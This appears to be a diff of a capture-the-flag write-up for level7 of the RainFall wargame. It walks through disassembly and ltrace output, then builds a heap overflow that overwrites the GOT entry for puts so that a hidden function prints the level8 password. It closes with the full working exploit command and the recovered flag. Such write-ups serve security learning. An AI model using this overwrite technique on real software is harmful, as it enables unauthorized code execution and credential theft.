@@ -8,6 +8,7 @@ Segmentation fault (core dumped)
 ~~
 
 # objdump -d level7
+
 08048521 <main>:
 
 8048527:	83 ec 20             	sub    $0x20,%esp
@@ -51,28 +52,78 @@ Segmentation fault (core dumped)
  80485ba:	89 04 24             	mov    %eax,(%esp)
  80485bd:	e8 1e fe ff ff       	call   80483e0 <strcpy@plt>
  80485c2:	ba e9 86 04 08       	mov    $0x80486e9,%edx
- 80485c7:	b8 eb 86 04 08       	mov    $0x80486eb,%eax
+ 80485c7:	b8 eb 86 04 08       	mov    $0x80486eb,%eax --> x/s 0x80486eb 0x80486eb: "/home/user/level8/.pass"
  80485cc:	89 54 24 04          	mov    %edx,0x4(%esp)
  80485d0:	89 04 24             	mov    %eax,(%esp)
- 80485d3:	e8 58 fe ff ff       	call   8048430 <fopen@plt>
+ 80485d3:	e8 58 fe ff ff       	call   8048430 <fopen@plt> --> We definitivlty open the .pass here ! 
  80485d8:	89 44 24 08          	mov    %eax,0x8(%esp)
  80485dc:	c7 44 24 04 44 00 00 	movl   $0x44,0x4(%esp)
  80485e3:	00
- 80485e4:	c7 04 24 60 99 04 08 	movl   $0x8049960,(%esp) # x /s 0x8048703 : 0x8048703:	 "~~" 
+ 80485e4:	c7 04 24 60 99 04 08 	movl   $0x8049960,(%esp) --> We stocked the .pass in this address
  80485eb:	e8 d0 fd ff ff       	call   80483c0 <fgets@plt>
- 80485f0:	c7 04 24 03 87 04 08 	movl   $0x8048703,(%esp)
+ 80485f0:	c7 04 24 03 87 04 08 	movl   $0x8048703,(%esp) # x /s 0x8048703 : 0x8048703:	 "~~" 
  80485f7:	e8 04 fe ff ff       	call   8048400 <puts@plt>
  80485fc:	b8 00 00 00 00       	mov    $0x0,%eax
  
-> ltrace ./level7 a a
-__libc_start_main(0x8048521, 3, 0xbffff7b4, 0x8048610, 0x8048680 <unfinished ...>
-malloc(8)                               = 0x0804a008
-malloc(8)                               = 0x0804a018
-malloc(8)                               = 0x0804a028
-malloc(8)                               = 0x0804a038
-strcpy(0x0804a018, "a")                 = 0x0804a018
-strcpy(0x0804a038, "a")                 = 0x0804a038
-fopen("/home/user/level8/.pass", "r")   = 0             # HERE hmmm
-fgets( <unfinished ...>
---- SIGSEGV (Segmentation fault) ---
-+++ killed by SIGSEGV +++
+ 
+ 
+ 
+080484f4 <m>:
+ 80484f4:	55                   	push   %ebp
+ 80484f5:	89 e5                	mov    %esp,%ebp
+ 80484f7:	83 ec 18             	sub    $0x18,%esp
+ 80484fa:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
+ 8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt>
+ 8048506:	ba e0 86 04 08       	mov    $0x80486e0,%edx
+ 804850b:	89 44 24 08          	mov    %eax,0x8(%esp)
+ 804850f:	c7 44 24 04 60 99 04 	movl   $0x8049960,0x4(%esp) --> variable address set in the main !
+ 8048516:	08 
+ 8048517:	89 14 24             	mov    %edx,(%esp)
+ 804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt> --> Here we can see that we print the variable set in the main
+ 804851f:	c9                   	leave  
+ 8048520:	c3                   	ret 
+
+# We can see in the main that it uses strcpy 2 times, strcpy is vunerable to buffer overflow, SO we can finaly make our plan...
+# We will use the first strcpy overflow to replace the destination address in the second strcpy with the DYNAMIC RELOCATION RECORDS
+# address of the puts function, to set it with the address of m ! (basicly using the overflow to say use m instead of puts)
+# So m will print the result of the open (aka the .pass)
+
+We need : - the offset to replace the destination of the second strcpy when overflowing the first strcpy
+          - the address of puts used in DYNAMIC RELOCATION RECORDS
+          - the address of our m function --> we got it already 080484f4
+         
+level7@RainFall:~$ objdump -R level7 | grep puts
+08049928 R_386_JUMP_SLOT   puts
+# we got the address boyyyys 08049928
+
+Last we need the offset:
+
+level7@RainFall:~$ ltrace ./level7 a a
+__libc_start_main(0x8048521, 3, 0xbffff6e4, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                                                   = 0x0804a008
+malloc(8)                                                                                   = 0x0804a018 --> here address of the first strcpy
+malloc(8)                                                                                   = 0x0804a028
+malloc(8)                                                                                   = 0x0804a038 --> here address of the second one
+strcpy(0x0804a018, "a")                                                                     = 0x0804a018
+strcpy(0x0804a038, "a")
+
+
+level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A --> We test it with a patern
+__libc_start_main(0x8048521, 2, 0xbffff784, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                       = 0x0804a008
+malloc(8)                                                       = 0x0804a018
+malloc(8)                                                       = 0x0804a028
+malloc(8)                                                       = 0x0804a038
+strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)       = 0x0804a018
+strcpy(0x37614136, NULL <unfinished ...> ---> We can see here that the address is not the one set by the malloc !
+
+we put it in https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/  -> We have our offset --> 20
+
+So now we just have to craft our call
+
+# ./level7 [[buffer of 20] + puts address]  [m address]
+          
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+> 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
+YEAY
